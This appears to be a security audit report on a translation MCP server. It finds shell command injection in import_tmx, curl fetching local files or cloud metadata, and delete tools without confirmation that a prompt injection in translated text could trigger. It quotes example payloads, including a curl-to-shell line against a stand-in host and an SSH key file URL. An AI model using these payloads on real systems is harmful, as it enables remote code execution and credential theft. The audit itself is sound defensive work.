## Findings

### F001 · CRITICAL · CMD-INJECTION
`src/tools/import_tmx.ts:58` · ASI05 Unexpected Code Execution

tmx_url from the import_tmx tool arguments (only checked to be a string) is put inside double quotes in a command run by child_process.exec, so `x"; curl evil.sh | sh; "` or `$(id)` runs arbitrary commands as the server user, with LARA_ACCESS_KEY_SECRET in its environment.
> `src/tools/import_tmx.ts:39` — `const { id, tmx_content, tmx_url, gzip } = validatedArgs;`
> `src/tools/import_tmx.ts:58` — `await execAsync(`curl -L "${tmx_url}" -o "${tempFilePath}"`);`

**Fix:** Do not shell out: download with fetch() (or execFile('curl', ['-L', '--proto', '=https', '-o', tempFilePath, '--', tmx_url])) after checking tmx_url is an https URL on an allowed host.

### M001 · HIGH · import_tmx makes curl fetch any URL or local file and uploads it
`None:None` · ASI02 Tool Misuse and Exploitation

Even without shell metacharacters, curl accepts any scheme and follows redirects, so tmx_url `file:///home/user/.ssh/id_rsa` or `http://169.254.169.254/...` makes the server read local files or internal services and upload the result to the Lara account.
> `src/tools/import_tmx.ts:39` — `const { id, tmx_content, tmx_url, gzip } = validatedArgs;`
> `src/tools/import_tmx.ts:58` — `await execAsync(`curl -L "${tmx_url}" -o "${tempFilePath}"`);`
> `src/tools/import_tmx.ts:63` — `return await lara.memories.importTmx(id, tempFilePath, gzip);`

**Fix:** Allow only https URLs to an allowlist of hosts, resolve the host and block private/loopback/link-local ranges, and disable redirects or re-check each hop (curl --proto =https --proto-redir =https, or fetch with redirect: 'manual').

### M002 · MEDIUM · Delete tools remove translation memories with no confirmation
`None:None` · 

delete_memory (and delete_translation) act immediately on any memory id the model supplies, so a prompt injection in the text being translated can wipe the account's translation memories.
> `src/index.ts:153` — `const result = await deleteMemory(args, lara);`
> `src/tools/delete_memory.ts:15` — `return await lara.memories.delete(id);`

**Fix:** Mark these tools destructive (MCP annotations destructiveHint: true) so clients ask for approval, or require an explicit confirm argument echoing the memory name.
